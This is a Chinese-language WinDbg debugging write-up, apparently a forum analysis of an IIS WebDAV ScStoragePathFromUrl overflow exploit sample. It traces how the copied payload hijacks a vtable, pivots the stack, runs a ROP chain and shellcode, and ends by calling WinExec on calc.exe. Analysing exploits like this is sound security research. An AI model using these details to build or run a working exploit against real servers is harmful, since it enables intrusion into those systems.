
# 调试跟踪记录

```
0:006> bl

 0 e 77ea411e     0001 (0001)  0:**** kernel32!WinExec

 1 e 67119464     0001 (0001)  0:**** httpext!CMethUtil::ScStoragePathFromUrl+0x13

 2 e 67126fdb     0001 (0001)  0:**** httpext!ScStoragePathFromUrl+0x360

 3 e 00fef7b8 w 4 0001 (0001)  0:**** 

0:006> bc 3

0:006> g

Breakpoint 1 hit

eax=00fef800 ebx=020f01e8 ecx=01ecfa80 edx=020f2878 esi=00000000 edi=77bd8ef2

eip=67119464 esp=00fef7a0 ebp=00fef7ac iopl=0         nv up ei pl nz na po nc

cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202

httpext!CMethUtil::ScStoragePathFromUrl+0x13:

67119464 e812d80000      call    httpext!ScStoragePathFromUrl (67126c7b)

0:006> dd 0x00fef90c L1

00fef90c  680312c0

0:006> dd 00fef7b8 L1

00fef7b8  680312c0
```

如上所述，当前参数如下

```
0:006> dds esp L3

00fef7a0  680312c0 rsaenh!g_pfnFree+0x4

00fef7a4  00fef800

00fef7a8  00000000
```

以上整个过程中，弄清了第一次大规模拷贝数据的意义：控制第二次大规模拷贝数据的目的地址

## 第二次大规模拷贝分析

现在分析第二次大规模拷贝，G一下，直接断在第三次`rep movsd`处

```
0:006> bl

 0 e 77ea411e     0001 (0001)  0:**** kernel32!WinExec

 1 e 67119464     0001 (0001)  0:**** httpext!CMethUtil::ScStoragePathFromUrl+0x13

 2 e 67126fdb     0001 (0001)  0:**** httpext!ScStoragePathFromUrl+0x360



0:006> g

Breakpoint 2 hit

eax=000005fc ebx=000002fd ecx=0000017f edx=680312c0 esi=020f2898 edi=680312e4

eip=67126fdb esp=00fef330 ebp=00fef798 iopl=0         nv up ei pl nz na po nc

cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202

httpext!ScStoragePathFromUrl+0x360:

67126fdb f3a5            rep movs dword ptr es:[edi],dword ptr [esi]
```

是的，目的寄存器`edi`的值在内存中属于`rsaenh.dll`模块

查看拷贝的源数据

```
0:006> du esi L2 * ecx

020f2898  "/bbbbbbb祈慵佃潧歯䡅㙆杵䐳㡱坥婢吵噡楒橓兗㡎奈捕䥱䍤摲㑨"

...(lines have been omitted)...

020f2e58  "L3W9P5POO0F2SMXJNJMJS8KJNKPA>"
```

拷贝之后的内存数据

```
0:006> db 680312e4 L4 * 17f

680312e4  2f 00 62 00 62 00 62 00-62 00 62 00 62 00 62 00  /.b.b.b.b.b.b.b.

...(lines have been omitted)...

680313b4  41 59 50 71 36 30 77 57-57 44 61 53 c0 13 03 68  AYPq60wWWDaS...h

680313c4  4f 6e 00 68 4f 6e 00 68-47 42 6a 76 c0 13 03 68  On.hOn.hGBjv...h

680313d4  57 42 74 4f 47 59 34 52-66 4b 42 4b 64 74 6f 78  WBtOGY4RfKBKdtox

680313e4  82 60 01 68 35 51 7a 72-7a 74 47 4d 59 44 57 57  .`.h5QzrztGMYDWW

...(lines have been omitted)...

680318d4  4e 00 4b 00 50 00 41 00-3e 00 00 00              N.K.P.A.>...
```

## 第三次大规模数据拷贝

现在分析第三次大规模数据拷贝，来到上层函数

```
0:006> bd *

0:006> p

eax=000005fc ebx=000002fd ecx=00000000 edx=680312c0 esi=020f2e94 edi=680318e0

eip=67126fdd esp=00fef330 ebp=00fef798 iopl=0         nv up ei pl nz na po nc

cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202

httpext!ScStoragePathFromUrl+0x362:

67126fdd 8bc8            mov     ecx,eax

0:006> be *

0:006> g

Breakpoint 1 hit

eax=00fef9a4 ebx=00fefbe8 ecx=01ecfa80 edx=020f0710 esi=00fefc28 edi=00000104

eip=67119464 esp=00fef944 ebp=00fef950 iopl=0         nv up ei pl nz na pe nc

cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206

httpext!CMethUtil::ScStoragePathFromUrl+0x13:

67119464 e812d80000      call    httpext!ScStoragePathFromUrl (67126c7b)
```

查看参数

```
0:006> dds esp L3

00fef944  00fefab4

00fef948  00fef9a4

00fef94c  00000000
```

G一下，断在第三次`rep movsd`处

```
0:006> g

Breakpoint 2 hit

eax=00000130 ebx=00000097 ecx=0000004c edx=00fefab4 esi=020f0730 edi=00fefad8

eip=67126fdb esp=00fef4d4 ebp=00fef93c iopl=0         nv up ei pl nz na po nc

cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202

httpext!ScStoragePathFromUrl+0x360:

67126fdb f3a5            rep movs dword ptr es:[edi],dword ptr [esi]
```

查看源数据，和第一次大规模拷贝的数据相同

```
0:006> du esi L2 * ecx

020f0730  "/aaaaaaa潨硣睡焳椶䝲稹䭷佰畓穏䡨噣浔桅㥓偬啧杣.䘰硅楒吱"

...(lines have been omitted)...

020f0830  "Ꮐ栃䠴攱潃湦瑁䍬Ꮐ栃千橁灒.塦䉌灋捆关祁穐䩬>"
```

拷贝之后的内存数据

```
0:006> db 00fefad8 L4 * 4c

00fefad8  2f 00 61 00 61 00 61 00-61 00 61 00 61 00 61 00  /.a.a.a.a.a.a.a.

00fefae8  68 6f 63 78 61 77 33 71-36 69 72 47 39 7a 77 4b  hocxaw3q6irG9zwK

...(lines have been omitted)...

00fefbe8  c0 13 03 68 43 53 41 6a-52 70 30 33 66 58 4c 42  ...hCSAjRp03fXLB

00fefbf8  4b 70 46 63 73 51 41 79-50 7a 6c 4a 3e 00 00 00  KpFcsQAyPzlJ>...
```

这次大规模拷贝的数据，连上第一次`rep movsd`，是从地址`0x00fefab4`开始的

G一下，再次来到上层函数

```
0:006> g

Breakpoint 1 hit

eax=00fef9a4 ebx=00fefbe8 ecx=680313c0 edx=020f2878 esi=00fefc28 edi=00000104

eip=67119464 esp=00fef944 ebp=00fef950 iopl=0         nv up ei pl nz na pe nc

cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206

httpext!CMethUtil::ScStoragePathFromUrl+0x13:

67119464 e812d80000      call    httpext!ScStoragePathFromUrl (67126c7b)
```

查看参数

```
0:006> dds esp L3

00fef944  00fefab4

00fef948  00fef9a4

00fef94c  00000000
```

此次的参数跟上一次参数是相同的，上一次已经向地址`0x00fefab4`拷贝了数据，经过调试，现在没有大规模数据拷贝了，跟进`httpext!ScStoragePathFromUrl`函数

单步来到地址`0x67126cc4`处，继续单步步入

```
67126cc4 e80cc90000      call    httpext!ScStripAndCheckHttpPrefix (671335d5)
```

`httpext!ScStoragePathFromUrl`函数中，关键代码如下

```
httpext!ScStripAndCheckHttpPrefix:

671335d5 8bff            mov     edi,edi

671335d7 55              push    ebp

671335d8 8bec            mov     ebp,esp

671335da 83ec0c          sub     esp,0Ch

671335dd 8365f800        and     dword ptr [ebp-8],0

671335e1 53              push    ebx

671335e2 56              push    esi

671335e3 8b32            mov     esi,dword ptr [edx]

671335e5 57              push    edi

671335e6 8bf9            mov     edi,ecx

671335e8 8b07            mov     eax,dword ptr [edi]  ds:0023:680313c0=680313c0

671335ea 8d4dfc          lea     ecx,[ebp-4]

671335ed 51              push    ecx

671335ee 8bcf            mov     ecx,edi

671335f0 8955f4          mov     dword ptr [ebp-0Ch],edx

671335f3 ff5024          call    dword ptr [eax+24h]
```

单步到地址`0x671335e8`处

```
0:006> t

eax=00fef9a4 ebx=00fefbe8 ecx=680313c0 edx=00fef4f8 esi=020f2878 edi=680313c0

eip=671335e8 esp=00fef4b8 ebp=00fef4d0 iopl=0         nv up ei pl zr na pe nc

cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246

httpext!ScStripAndCheckHttpPrefix+0x13:

671335e8 8b07            mov     eax,dword ptr [edi]  ds:0023:680313c0=680313c0
```

很明显`ecx`是`this`指针，`ecx`给到`edi`，`edi`取内容给`eax`，那么`eax`此时是虚表指针

继续单步

```
0:006> t

eax=680313c0 ebx=00fefbe8 ecx=680313c0 edx=00fef4f8 esi=020f2878 edi=680313c0

eip=671335f3 esp=00fef4b4 ebp=00fef4d0 iopl=0         nv up ei pl zr na pe nc

cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246

httpext!ScStripAndCheckHttpPrefix+0x1e:

671335f3 ff5024          call    dword ptr [eax+24h]  ds:0023:680313e4=68016082
```

调用虚函数，进入第二次大规模布置数据的内存中

![](https://bbs.kanxue.com/upload/attach/201704/727775_b3li45ltfvj4dn7.png)

继续单步步入，首先是换栈操作

```
68016082 8be1            mov     esp,ecx

68016084 8b08            mov     ecx,dword ptr [eax]

68016086 8b4004          mov     eax,dword ptr [eax+4]

68016089 50              push    eax

6801608a c3              ret
```

经过ROP链和解密`shellcode`后，执行到

```
680315fa ffe0            jmp     eax {kernel32!WinExec (77ea411e)}
```

查看命令行参数

```
0:006> db poi(esp + 4) L9

68031633  63 61 6c 63 2e 65 78 65-00                       calc.exe.
```

运行起来，如图所示，产生`calc.exe`进程(为了方便调试，前文已经提过，加载`w3wp.exe`之前运行一次样本已经存在一个`calc.exe`进程)

![](https://bbs.kanxue.com/upload/attach/201704/727775_qcty8lvly6knxo7.png)

该结束了，可是好像只用到了前两次大规模的数据，那么第三次拷贝的意义在哪里呢？

其实第三次拷贝数据之后，调用`CMethUtil::ScStoragePathFromUrl`之前，来到`CParseLockTokenHeader::HrGetLockIdForPath`函数

以下几句代码就是`ecx`的值的来源

```
6712571a 8b9dc4fdffff    mov     ebx,dword ptr [ebp-23Ch]

67125720 8b0b            mov     ecx,dword ptr [ebx]

67125722 c1e803          shr     eax,3

67125725 8985d4fdffff    mov     dword ptr [ebp-22Ch],eax

6712572b 8d85d4fdffff    lea     eax,[ebp-22Ch]

67125731 50              push    eax

67125732 ff75ec          push    dword ptr [ebp-14h]

67125735 ffb5e0feffff    push    dword ptr [ebp-120h]

6712573b e8113dffff      call    httpext!CMethUtil::ScStoragePathFromUrl (67119451)
```

单步围观
